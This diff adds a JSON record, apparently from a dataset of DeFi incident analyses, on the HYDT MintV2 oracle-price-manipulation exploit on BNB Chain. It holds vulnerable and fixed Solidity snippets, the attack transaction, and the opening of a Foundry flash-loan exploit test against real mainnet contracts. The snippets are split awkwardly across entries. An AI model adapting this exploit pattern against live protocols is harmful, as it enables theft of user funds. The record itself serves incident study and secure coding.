@@ -1,0 +1,33 @@
+{
+ "id": "2024__2024-10-10_HYDT_OracleMintManipulation",
+ "source_file": "2024/2024-10-10_HYDT_OracleMintManipulation.md",
+ "title": "HYDT — MintV2 Price Manipulation for Excess Token Minting Analysis",
+ "date": "2024-10-10",
+ "protocol": "HYDT Protocol",
+ "chain": "BNB Chain",
+ "loss_raw": "~5,800 USD",
+ "loss_usd": null,
+ "root_cause": "`MintV2.initialMint()` calculates HYDT mint amount using the spot price from `getReserves()` of the WBNB-USDT Pair — manipulating the reserve ratio allows excessive HYDT minting",
+ "attack_tx": "0xa9df1bd97cf6d4d1d58d3adfbdde719e46a1548db724c2e76b4cd4c3222f22b3",
+ "vulnerable_contract": "0xA2268Fcc2FE7A2Bb755FbE5A7B3Ac346ddFeDB9B (MintV2)",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: mint amount calculated using WBNB-USDT Pair spot price\n// MintV2: 0xA2268Fcc2FE7A2Bb755FbE5A7B3Ac346ddFeDB9B\nfunction initialMint() external payable {\n    //",
+  "❌ Uses current spot price from getReserves() — manipulable via flash loan\n    (uint112 r0, uint112 r1,) = IUniswapV2Pair(WBNB_USDT_PAIR).getReserves();\n    uint256 bnbPriceInUSDT = (r1 * 1e18) / r0;  //",
+  "❌ Spot price\n\n    // Higher BNB price → more HYDT minted\n    uint256 mintAmount = msg.value * bnbPriceInUSDT / 1e18;\n    IHYDT(HYDT).mint(msg.sender, mintAmount);\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct code: use TWAP price\nfunction initialMint() external payable {\n    //",
+  "✅ Use TWAP for manipulation-resistant price\n    uint256 bnbPriceInUSDT = twapOracle.consult(WBNB, 1e18, USDT);\n    uint256 mintAmount = msg.value * bnbPriceInUSDT / 1e18;\n    IHYDT(HYDT).mint(msg.sender, mintAmount);\n}"
+ ],
+ "steps": [
+  "► USDT → WBNB swap (PancakeRouter)",
+  "[3] ► Half of minted HYDT → USDT swap (V3 Router)",
+  "[4] ► Remaining HYDT → WBNB → USDT swap"
+ ],
+ "other_code": [
+  "address constant MintV2 = 0xA2268Fcc2FE7A2Bb755FbE5A7B3Ac346ddFeDB9B;\naddress constant HYDT_ADDR = 0x9810512Be701801954449408966c630595D0cD51;\n\ncontract ContractTest is Test {\n    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n    Uni_Pair_V3 pool = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 HYDT = IERC20(0x9810512Be701801954449408966c630595D0cD51);\n\n    function testExploit() external {\n        // [1] PancakeSwap V3 flash loan 11,000,000 USDT\n        borrow_amount = 11_000_000 ether;\n        pool.flash(address(this), borrow_amount, 0, \"\");\n    }\n\n    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory) public {\n        // [2] Manipulate BNB price by swap"
+ ]
+}
